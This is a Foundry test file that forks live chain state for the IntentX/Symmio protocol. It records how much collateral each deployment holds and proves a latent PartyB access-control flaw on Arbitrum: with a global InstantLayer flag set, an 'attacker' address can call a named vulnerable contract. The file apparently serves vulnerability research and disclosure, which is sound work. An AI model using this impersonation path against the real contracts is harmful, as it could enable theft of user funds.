// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function totalSupply() external view returns (uint256);
}

interface ISymmioCore {
    function getCollateral() external view returns (address);
    function isCallFromInstantLayer() external view returns (bool);
    function hasRole(address user, bytes32 role) external view returns (bool);
    function allocatedBalanceOfPartyB(address partyB, address partyA) external view returns (uint256);
}

interface ISymmioPartyB {
    function _call(bytes[] calldata callDatas) external;
    function adlClose(uint256[] calldata quoteIds, uint256[] calldata amounts, uint256[] calldata prices) external;
    function symmioAddress() external view returns (address);
    function paused() external view returns (bool);
}

/// @title IntentX live-state + latent PartyB vulnerability fork checks (read-only).
/// All tests run on local forks. No mainnet transactions.
contract IntentXTest is Test {
    // ── Base ─────────────────────────────────────────────────────────────
    address constant BASE_DIAMOND = 0x91Cf2D8Ed503EC52768999aA6D8DBeA6e52dbe43;
    address constant BASE_USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant BASE_VERIFIER = 0x0Ae899A702b9a7E6fbAd661117F0b1B002eD18F1;
    address constant BASE_VAULT = 0x7785fE35F6510D111063579AA14F7D28aD84512A;
    address constant BASE_LP = 0xB6d340Af68279326402139C30934317929535D32;
    address constant BASE_INSTANT_LAYER = 0x0825435285ac0E5c02c7a7c443F631f3e07fE375;

    // ── Arbitrum ─────────────────────────────────────────────────────────
    address constant ARB_DIAMOND = 0x8F06459f184553e5d04F07F868720BDaCAB39395;
    address constant ARB_USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant ARB_PB_VULN = 0x0b5B3f9b727656A254ec1203D8b2A86b4540F5F5;
    address constant ARB_PB_FIXED = 0xE72284fc2D56bE2C1649742FD131BceA41A94a6a;
    address constant ARB_INSTANT_LAYER = 0x4a6A866e62b38EEDFd4d99599F7E2baA35336d1c;

    // ── Mantle ───────────────────────────────────────────────────────────
    address constant MANTLE_DIAMOND = 0x2Ecc7da3Cc98d341F987C85c3D9FC198570838B5;
    address constant MANTLE_USDE = 0x5d3a1Ff2b6BAb83b63cd9AD0787074081a52ef34;

    // ── Blast ────────────────────────────────────────────────────────────
    address constant BLAST_DIAMOND = 0x3d17f073cCb9c3764F105550B0BCF9550477D266;
    address constant BLAST_USDB = 0x4300000000000000000000000000000000000003;

    // GlobalAppStorage slot: keccak256("diamond.standard.storage.global") + 10
    // `callFromInstantLayer` is a bool at byte offset 21 of that slot.
    uint256 constant GLOBAL_SLOT_BASE =
        0x9a4861c42efbcffcc59654e070976ca1f4a2ce14007af3ccc7b4998e5b0326b1;
    uint256 constant CALL_FROM_INSTANT_LAYER_SLOT = GLOBAL_SLOT_BASE + 10;
    bytes32 constant FLAG_TRUE = bytes32(uint256(1) << 168);

    address attacker = address(0xBADD00D);

    function _fork(string memory key, string memory fallbackUrl) internal returns (uint256) {
        return vm.createSelectFork(vm.envOr(key, fallbackUrl));
    }

    function _setInstantFlag(address diamond) internal {
        vm.store(diamond, bytes32(CALL_FROM_INSTANT_LAYER_SLOT), FLAG_TRUE);
        assertTrue(ISymmioCore(diamond).isCallFromInstantLayer(), "flag not set");
    }

    // ══════════════════════════ LIVE STATE ══════════════════════════

    function test_base_live_state() public {
        _fork("BASE_RPC_URL", "https://base-rpc.publicnode.com");
        assertEq(ISymmioCore(BASE_DIAMOND).getCollateral(), BASE_USDC, "base collateral");
        uint256 bal = IERC20(BASE_USDC).balanceOf(BASE_DIAMOND);
        emit log_named_uint("Base diamond USDC (6dp)", bal);
        assertGt(bal, 1_000_000e6, "base pot > $1M");
        assertFalse(ISymmioCore(BASE_DIAMOND).isCallFromInstantLayer(), "instant flag must be false");
        assertGt(BASE_VERIFIER.code.length, 0, "muon verifier deployed");
        assertGt(BASE_INSTANT_LAYER.code.length, 0, "instant layer deployed");
    }

    function test_arb_live_state() public {
        _fork("ARB_RPC_URL", "https://arb1.arbitrum.io/rpc");
        assertEq(ISymmioCore(ARB_DIAMOND).getCollateral(), ARB_USDC, "arb collateral");
        uint256 bal = IERC20(ARB_USDC).balanceOf(ARB_DIAMOND);
        emit log_named_uint("Arb diamond USDC (6dp)", bal);
        assertGt(bal, 500_000e6, "arb pot > $500k");
        assertFalse(ISymmioCore(ARB_DIAMOND).isCallFromInstantLayer(), "instant flag must be false");
    }

    function test_mantle_live_state() public {
        _fork("MANTLE_RPC_URL", "https://rpc.mantle.xyz");
        assertEq(ISymmioCore(MANTLE_DIAMOND).getCollateral(), MANTLE_USDE, "mantle collateral");
        uint256 bal = IERC20(MANTLE_USDE).balanceOf(MANTLE_DIAMOND);
        emit log_named_uint("Mantle diamond USDe (18dp)", bal);
        assertGt(bal, 60_000e18, "mantle pot > 60k");
        assertFalse(ISymmioCore(MANTLE_DIAMOND).isCallFromInstantLayer(), "instant flag must be false");
    }

    function test_blast_live_state() public {
        _fork("BLAST_RPC_URL", "https://blast-rpc.publicnode.com");
        assertEq(ISymmioCore(BLAST_DIAMOND).getCollateral(), BLAST_USDB, "blast collateral");
        uint256 bal = IERC20(BLAST_USDB).balanceOf(BLAST_DIAMOND);
        emit log_named_uint("Blast diamond USDB (18dp)", bal);
        assertGt(bal, 40e18, "blast pot > 40");
        // Blast runs the older core: no isCallFromInstantLayer() getter.
        (bool ok,) = BLAST_DIAMOND.staticcall(abi.encodeWithSignature("isCallFromInstantLayer()"));
        assertFalse(ok, "blast is older core (getter absent)");
    }

    /// @notice Blast accounting is paused: deposits/withdrawals/allocations all revert.
    ///         The ~40.5 USDB held there is stuck unless the team unpauses (privileged).
    function test_blast_accounting_paused() public {
        _fork("BLAST_RPC_URL", "https://blast-rpc.publicnode.com");
        bytes memory expected = abi.encodeWithSignature("Error(string)", "Pausable: Accounting paused");

        (bool ok1, bytes memory r1) = BLAST_DIAMOND.call(abi.encodeWithSignature("deposit(uint256)", 1));
        assertFalse(ok1, "deposit must revert");
        assertEq(keccak256(r1), keccak256(expected), "deposit revert reason");

        (bool ok2, bytes memory r2) = BLAST_DIAMOND.call(abi.encodeWithSignature("withdraw(uint256)", 1));
        assertFalse(ok2, "withdraw must revert");
        assertEq(keccak256(r2), keccak256(expected), "withdraw revert reason");
    }

    function test_base_solver_vault_is_empty() public {
        _fork("BASE_RPC_URL", "https://base-rpc.publicnode.com");
        assertEq(IERC20(BASE_USDC).balanceOf(BASE_VAULT), 0, "vault USDC must be 0");
        assertEq(IERC20(BASE_LP).totalSupply(), 0, "LP supply must be 0");
    }

    // ══════════════ LATENT PARTYB BUG (gate closed today) ══════════════

    /// @notice Today the InstantLayer flag is false, so the vulnerable PartyB check is closed.
    function test_arb_vuln_partyB_gate_closed() public {
        _fork("ARB_RPC_URL", "https://arb1.arbitrum.io/rpc");
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSignature("getCollateral()");

        vm.prank(attacker);
        vm.expectRevert("SymmioPartyB: Invalid access");
        ISymmioPartyB(ARB_PB_VULN)._call(calls);

        uint256[] memory empty = new uint256[](0);
        vm.prank(attacker);
        vm.expectRevert("SymmioPartyB: Invalid access");
        ISymmioPartyB(ARB_PB_VULN).adlClose(empty, empty, empty);
    }

    /// @notice If any InstantLayer batch runs (flag true), arbitrary code can call the
    ///         vulnerable PartyB as if it were the InstantLayer. We simulate the batch
    ///         state with vm.store to prove the mechanism (no mainnet tx).
    function test_arb_vuln_partyB_accepts_anyone_when_flag_true() public {
        _fork("ARB_RPC_URL", "https://arb1.arbitrum.io/rpc");
        _setInstantFlag(ARB_DIAMOND);

        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSignature("getCollateral()");

        vm.prank(attacker);
        ISymmioPartyB(ARB_PB_VULN)._call(calls); // succeeds: impersonation via global flag

        uint256[] memory empty = new uint256[](0);
        vm.prank(attacker);
        ISymmioPartyB(ARB_PB_VULN).adlClose(empty, empty, empty); // succeeds too
    }

    /// @notice The patched PartyB (same proxy family, upgraded impl) rejects the same call.
    function test_arb_fixed_partyB_rejects_when_flag_true() public {
        _fork("ARB_RPC_URL", "https://arb1.arbitrum.io/rpc");
        _setInstantFlag(ARB_DIAMOND);

        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSignature("getCollateral()");

        vm.prank(attacker);
        vm.expectRevert("SymmioPartyB: Invalid access");
        ISymmioPartyB(ARB_PB_FIXED)._call(calls);
    }

    /// @notice Sanity: the InstantLayer itself holds the core INSTANT_LAYER_ROLE and the
    ///         vulnerable PartyB has never traded (its diamond balances are zero).
    function test_arb_roles_and_unused_vuln_partyB() public {
        _fork("ARB_RPC_URL", "https://arb1.arbitrum.io/rpc");
        bytes32 ilr = keccak256("INSTANT_LAYER_ROLE");
        assertTrue(ISymmioCore(ARB_DIAMOND).hasRole(ARB_INSTANT_LAYER, ilr), "IL holds role");
        assertEq(
            ISymmioCore(ARB_DIAMOND).allocatedBalanceOfPartyB(ARB_PB_VULN, ARB_PB_VULN),
            0,
            "vuln partyB has no balance"
        );
    }
}
